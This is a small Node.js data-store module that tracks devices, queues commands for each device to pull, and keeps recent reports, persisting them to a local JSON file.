const fs = require('fs');
const path = require('path');

const DB_FILE = path.join(__dirname, 'db.json');

let devices = new Map();
let commands = new Map();
let reports = [];

if (fs.existsSync(DB_FILE)) {
    try {
        const data = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
        devices = new Map(Object.entries(data.devices || {}));
        commands = new Map(Object.entries(data.commands || {}));
        reports = data.reports || [];
    } catch (e) {}
}

function saveToFile() {
    try {
        const data = {
            devices: Object.fromEntries(devices),
            commands: Object.fromEntries(commands),
            reports: reports
        };
        fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
    } catch (e) {}
}

module.exports = {
  addDevice(id, model) {
    devices.set(id, { id, model: model || 'android', last_seen: Date.now() });
    saveToFile();
  },
  removeDevice(id) {
    devices.delete(id);
    commands.delete(id);
    saveToFile();
  },
  listDevices() {
    return Array.from(devices.values()).sort((a, b) => b.last_seen - a.last_seen);
  },
  queueCommand(deviceId, cmd, arg) {
    if (!commands.has(deviceId)) commands.set(deviceId, []);
    commands.get(deviceId).push({
      id: Date.now() + Math.floor(Math.random() * 1000),
      cmd,
      arg: arg || '',
      done: 0
    });
    saveToFile();
  },
  pullCommands(deviceId) {
    const list = commands.get(deviceId) || [];
    const fresh = list.filter(c => c.done === 0);
    if (fresh.length > 0) {
        fresh.forEach(c => { c.done = 1; });
        saveToFile();
    }
    return fresh;
  },
  saveReport(deviceId, kind, body) {
    reports.push({ deviceId, kind, body, created: Date.now() });
    if (reports.length > 100) reports.shift();
  }
};
